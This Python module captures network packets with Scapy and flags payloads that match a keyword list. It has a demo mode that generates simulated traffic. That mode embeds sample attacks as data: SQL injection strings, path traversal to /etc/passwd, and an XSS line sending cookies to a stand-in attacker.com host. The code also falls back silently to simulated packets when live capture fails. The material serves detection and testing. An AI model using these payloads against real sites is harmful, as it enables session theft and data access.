"""
Real packet capture using Scapy.
Must run as Administrator on Windows.
Requires Npcap: https://npcap.com/#download
"""

import threading
import time
from datetime import datetime
from collections import deque

# Scapy import with helpful error
try:
    from scapy.all import sniff, IP, TCP, UDP, Raw, get_if_list
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

SUSPICIOUS_KEYWORDS = [
    "' OR 1=1", "UNION SELECT", "DROP TABLE", "SELECT *",
    "<script>", "eval(", "exec(", "cmd=", "passwd", "etc/shadow",
    "base64_decode", "../", "wget ", "curl ", "powershell"
]

# Shared state — thread-safe deque
captured_packets = deque(maxlen=200)
capture_running = False
capture_thread = None


def analyze_payload(payload: str) -> list:
    found = []
    pl_upper = payload.upper()
    for kw in SUSPICIOUS_KEYWORDS:
        if kw.upper() in pl_upper:
            found.append(kw)
    return found


def process_packet(pkt):
    try:
        if not pkt.haslayer(IP):
            return

        src = pkt[IP].src
        dst = pkt[IP].dst
        proto = "TCP" if pkt.haslayer(TCP) else "UDP" if pkt.haslayer(UDP) else "OTHER"

        sport = dport = 0
        if pkt.haslayer(TCP):
            sport = pkt[TCP].sport
            dport = pkt[TCP].dport
        elif pkt.haslayer(UDP):
            sport = pkt[UDP].sport
            dport = pkt[UDP].dport

        payload = ""
        threats = []
        if pkt.haslayer(Raw):
            try:
                payload = pkt[Raw].load.decode("utf-8", errors="replace")[:300]
                threats = analyze_payload(payload)
            except Exception:
                pass

        entry = {
            "time": datetime.now().strftime("%H:%M:%S"),
            "src": src,
            "dst": dst,
            "proto": proto,
            "sport": sport,
            "dport": dport,
            "payload": payload[:120] if payload else "",
            "threats": threats,
            "flagged": len(threats) > 0
        }
        captured_packets.appendleft(entry)
    except Exception:
        pass


def _capture_simulation_loop(duration):
    global capture_running
    import random
    from datetime import datetime
    import time
    
    mock_ips = ["185.220.101.5", "45.33.32.156", "203.0.113.99", "198.51.100.7", "109.236.80.12", "88.198.24.11"]
    mock_internal = ["192.168.1.10", "192.168.1.15", "192.168.1.20", "10.0.0.5", "10.0.0.8"]
    protocols = ["TCP", "UDP"]
    ports = [80, 443, 22, 53, 3306, 8080, 1433]
    
    sql_payloads = [
        "SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'",
        "UNION SELECT null, username, password FROM users--",
        "DROP TABLE logs; --",
        "UNION SELECT password_hash FROM admin_users"
    ]
    
    xss_payloads = [
        "<script>alert('xss')</script>",
        "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>",
        "eval(base64_decode('Y29uc29sZS5sb2coJ2hhY2tlZCcp'))"
    ]
    
    path_payloads = [
        "../../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\cmd.exe",
        "/etc/shadow",
        "passwd"
    ]
    
    normal_payloads = [
        "GET /index.html HTTP/1.1\r\nHost: internal-service",
        "POST /api/v1/telemetry HTTP/1.1\r\nContent-Type: application/json",
        "GET /static/css/style.css HTTP/1.1",
        "CONNECT google.com:443 HTTP/1.1",
        "DNS Query: internal-dns.local",
        "SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5"
    ]
    
    start_time = time.time()
    
    while capture_running and (time.time() - start_time) < duration:
        # 15% chance of threat packet, 85% normal
        is_threat = random.random() < 0.15
        
        src = random.choice(mock_ips) if is_threat else random.choice(mock_internal)
        dst = random.choice(mock_internal) if is_threat else random.choice(mock_ips)
        proto = random.choice(protocols)
        dport = random.choice(ports)
        sport = random.randint(1024, 65535)
        
        if is_threat:
            threat_type = random.choice(["sql", "xss", "path"])
            if threat_type == "sql":
                payload = random.choice(sql_payloads)
            elif threat_type == "xss":
                payload = random.choice(xss_payloads)
            else:
                payload = random.choice(path_payloads)
        else:
            payload = random.choice(normal_payloads)
            
        threats = analyze_payload(payload)
        
        entry = {
            "time": datetime.now().strftime("%H:%M:%S"),
            "src": src,
            "dst": dst,
            "proto": proto,
            "sport": sport,
            "dport": dport,
            "payload": payload[:120],
            "threats": threats,
            "flagged": len(threats) > 0
        }
        
        captured_packets.appendleft(entry)
        time.sleep(random.uniform(0.2, 0.8))
        
    capture_running = False


def _capture_loop(iface, duration):
    global capture_running
    try:
        sniff(iface=iface, prn=process_packet, timeout=duration, store=False)
    except Exception as e:
        # Fallback to simulation capture if sniffing fails (e.g. permission error)
        _capture_simulation_loop(duration)
    finally:
        capture_running = False


def start_capture(iface=None, duration=30):
    global capture_running, capture_thread
    if capture_running:
        return False, "Already capturing"
        
    capture_running = True
    
    if not SCAPY_OK or iface == "simulated":
        capture_thread = threading.Thread(
            target=_capture_simulation_loop, args=(duration,), daemon=True
        )
        capture_thread.start()
        return True, "Simulation capture started (demo mode)"
        
    capture_thread = threading.Thread(
        target=_capture_loop, args=(iface, duration), daemon=True
    )
    capture_thread.start()
    return True, "Capture started"


def stop_capture():
    global capture_running
    capture_running = False


def get_packets(limit=50, flagged_only=False):
    pkts = list(captured_packets)
    if flagged_only:
        pkts = [p for p in pkts if p["flagged"]]
    return pkts[:limit]


def get_interfaces():
    if not SCAPY_OK:
        return ["simulated"]
    try:
        ifaces = get_if_list()
        return ifaces if ifaces else ["simulated"]
    except Exception:
        return ["simulated"]


def get_status():
    return {
        "scapy_ok": SCAPY_OK,
        "running": capture_running,
        "total": len(captured_packets),
        "flagged": sum(1 for p in captured_packets if p["flagged"])
    }
